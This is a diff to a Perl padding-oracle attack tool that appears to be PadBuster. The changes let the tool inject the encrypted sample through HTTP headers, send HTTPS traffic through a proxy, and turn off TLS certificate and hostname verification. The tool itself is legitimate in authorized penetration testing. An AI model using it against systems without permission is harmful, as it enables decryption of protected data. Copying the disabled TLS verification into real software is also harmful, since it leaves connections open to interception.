@@ -9,7 +9,6 @@
 # code for performing various brute force attack techniques, and wireghoul (Eldar 
 # Marcussen) for making code quality improvements. Credits for variuos
 # improvements to GW (gw.2011@tnode.com or http://gw.tnode.com/) - Viris.
-# 
 
 use LWP::UserAgent;
 use strict;
@@ -23,6 +22,9 @@ use Compress::Zlib;
 use Crypt::SSLeay;
 use File::Basename qw(dirname);
 use File::Path qw(make_path);
+
+# Disable certificate / hostname verification (insecure, but useful for testing)
+$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;
 
 # Set defaults with $variable = value
 my $logging;
@@ -97,7 +99,7 @@ if ($#ARGV < 2) {
 
   Where: URL = The target URL (and query string if applicable)
          EncryptedSample = The encrypted value you want to test. Must
-                           also be present in the URL, PostData or a Cookie
+                           also be present in the URL, PostData, a Cookie or a Header
          BlockSize = The block size being used by the algorithm
 
 Options:
@@ -301,11 +303,11 @@ if ($bruteForce) {
 		   $combinedBf = &myEncode($combinedBf, $encodingFormat);
 
 		   # Add the Query String to the URL
-		   my ($testUrl, $testPost, $testCookies) = &prepRequest($url, $post, $cookie, $sample, $combinedBf);  	  
+		   my ($testUrl, $testPost, $testCookies, $testHeaders) = &prepRequest($url, $post, $cookie, $headers, $sample, $combinedBf);  	  
 		   
 
 		   # Issue the request
-		   my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies);
+		   my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies, $testHeaders);
 
 		   my $signatureData = ($useBody) ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";
 
@@ -515,7 +517,8 @@ sub determineSignature {
 			}
 		} else {
 		    @oracleNums =split(/[,\s]+/, &promptUser("\nEnter a comma separated list of IDs that match the error condition\nNOTE: The ID# marked with ** is recommended",''));
-		}
+
+		    }
 		for (@oracleNums) {
 			push(@oracleSignatures, $sortedGuesses[$_-1]);
 		}
@@ -526,7 +529,7 @@ sub determineSignature {
 }
 
 sub prepRequest {
-	my ($pUrl, $pPost, $pCookie, $pSample, $pTestBytes) = @_;
+	my ($pUrl, $pPost, $pCookie, $pHeaders, $pSample, $pTestBytes) = @_;
 
 	# Prepare the request			
 	my $testUrl = $pUrl;
@@ -555,11 +558,20 @@ sub prepRequest {
 		}
 	}
 
+	my $testHeaders = "";
+	if ($pHeaders) {
+		$testHeaders = $pHeaders;
+		if ($pHeaders =~ /$pSample/) {
+			$testHeaders =~ s/$pSample/$pTestBytes/;
+			$wasSampleFound = 1;
+		}
+	}
+
 	if ($wasSampleFound == 0) {
 		&myPrint("ERROR: Encrypted sample was not found in the test request",0);
 		exit();
 	}
-	return ($testUrl, $testPost, $testCookies);
+	return ($testUrl, $testPost, $testCookies, $testHeaders);
 }
 
 sub processBlock {
@@ -608,11 +620,11 @@ sub processBlock {
 					$combinedTestBytes = &uri_escape($combinedTestBytes); 
 				}
 
-				my ($testUrl, $testPost, $testCookies) = &prepRequest($url, $post, $cookie, $sample, $combinedTestBytes);
+				my ($testUrl, $testPost, $testCookies, $testHeaders) = &prepRequest($url, $post, $cookie, $headers, $sample, $combinedTestBytes);
 
 				# Ok, now make the request
 
-				my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies);
+				my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies, $testHeaders);
 
 				
 				my $signatureData = ($useBody) ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";
@@ -741,7 +753,7 @@ sub processBlock {
 
 sub makeRequest {
  
- my ($method, $url, $data, $cookie) = @_; 
+ my ($method, $url, $data, $cookie, $customHeaders) = @_; 
  my ($noConnect, $status, $content, $req, $location, $contentLength);   
  my $numRetries = 0;
  $data ='' unless $data;
@@ -754,7 +766,13 @@ sub makeRequest {
   
   if(!$lwp || ($totalRequests % $reqsPerSession) == 0) {
     sleep $retryWait;
-    $lwp = LWP::UserAgent->new(env_proxy => 1, keep_alive => 1, timeout => 60, requests_redirectable => []);
+    $lwp = LWP::UserAgent->new(
+        env_proxy             => 1,
+        keep_alive            => 1,
+        timeout               => 60,
+        requests_redirectable => [],
+        ssl_opts              => { verify_hostname => 0, SSL_verify_mode => 0x00 },
+    );
 
     if ($proxy) {
   	  my $proxyUrl = "http://";
@@ -765,8 +783,9 @@ sub makeRequest {
 		$proxyUrl .= $proxyAuth."@";
  	  }
  	  $proxyUrl .= $proxy;
- 	  $lwp->proxy(['http'], "http://".$proxy);
-	  $ENV{HTTPS_PROXY} = "http://".$proxy;
+ 	  $lwp->proxy(['http','https'], $proxyUrl);
+	  $ENV{HTTP_PROXY}  = $proxyUrl;
+	  $ENV{HTTPS_PROXY} = $proxyUrl;
     }
   }
  
@@ -791,10 +810,15 @@ sub makeRequest {
    $req->header(Cookie => $cookie);
   }
  
-  if ($headers) {
-   my @customHeaders = split(/;/i,$headers);
-   for (my $i = 0; $i <= $#customHeaders; $i++) {
-    my ($headerName, $headerVal) = split(/\::/i,$customHeaders[$i]);
+  my $headerString = defined($customHeaders) && $customHeaders ne ''
+      ? $customHeaders
+      : $headers;
+
+  if ($headerString) {
+   my @customHeadersArr = split(/;/i,$headerString);
+   for (my $i = 0; $i <= $#customHeadersArr; $i++) {
+    my ($headerName, $headerVal) = split(/\::/i,$customHeadersArr[$i]);
+    next unless defined $headerName && defined $headerVal;
     $req->header($headerName, $headerVal);
    }
   }
@@ -831,6 +855,7 @@ sub makeRequest {
   my $statusMsg = $response->status_line;
   #myPrint("Status: $statusMsg, Location: $location, Length: $contentLength",1); 
  
+
   #eg: Status: 500 Can't connect to example.com:81 (connect: Connection timed out), Location: N/A, Length:
   #eg: Status: 500 Server closed connection without sending any data back, Location: N/A, Length:
   if (!defined($location) && !defined($contentLength) && $status eq '500') {
@@ -1029,4 +1054,3 @@ sub min($$$){
   if ($_[0] < $_[2]){ pop @_; } else { shift @_; }
   return $_[0] < $_[1]? $_[0]:$_[1];
 }
-
